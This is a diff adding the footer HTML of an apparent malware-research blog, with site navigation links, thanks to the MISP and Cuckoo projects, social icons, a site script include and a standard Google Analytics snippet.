+          <div class="medium-6 large-5 columns">
+            <h5 class="shadow-black">About This Site</h5>
+
+            <p class="shadow-black">
+              Sleep is a symptom of  »caffeine« deprivation!
+              <a href="http://malware2.dontneedcoffee.com/info/">More ›</a>
+            </p>
+          </div><!-- /.large-6.columns -->
+
+
+          <div class="small-6 medium-3 large-3 large-offset-1 columns">
+            
+              
+                <h5 class="shadow-black">Services</h5>
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+
+              <ul class="no-bullet shadow-black">
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/contact/"  title="Contact">Contact</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/feed.xml"  title="Subscribe to RSS Feed">RSS</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/atom.xml"  title="Subscribe to Atom Feed">Atom</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/sitemap.xml"  title="Sitemap for Google Webmaster Tools">sitemap.xml</a>
+                  </li>
+              
+              </ul>
+          </div><!-- /.large-4.columns -->
+
+
+          <div class="small-6 medium-3 large-3 columns">
+            
+              
+                <h5 class="shadow-black">Merci</h5>
+              
+            
+              
+            
+              
+            
+
+            <ul class="no-bullet shadow-black">
+            
+              
+                <li >
+                  <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                </li>
+            
+              
+                <li class="network-misp" >
+                  <a href="https://github.com/MISP" target="_blank"  title="MISP Project - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing">MISP</a>
+                </li>
+            
+              
+                <li class="network-cuckoo" >
+                  <a href="https://cuckoosandbox.org/" target="_blank"  title="Automate Malware Analysis">Cuckoo</a>
+                </li>
+            
+            </ul>
+          </div><!-- /.large-3.columns -->
+        </div><!-- /.row -->
+
+      </div><!-- /#footer -->
+
+
+      <div id="subfooter">
+        <nav class="row">
+          <section id="subfooter-left" class="small-12 medium-6 columns credits">
+            
+          </section>
+
+          <section id="subfooter-right" class="small-12 medium-6 columns">
+            <ul class="inline-list social-icons">
+            
+              <li><a href="http://github.com/Kafeine" target="_blank" class="icon-github" title="Code and more..."></a></li>
+            
+              <li><a href="http://twitter.com/Kafeine" target="_blank" class="icon-twitter" title="Last tweets"></a></li>
+            
+            </ul>
+          </section>
+        </nav>
+      </div><!-- /#subfooter -->
+    </footer>
+
+	
+
+	
+
+
+<script src="http://malware2.dontneedcoffee.com/assets/js/javascript.min.js"></script>
+
+
+
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-3016897-22', 'auto');
+  ga('set', 'anonymizeIp', true);
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
+
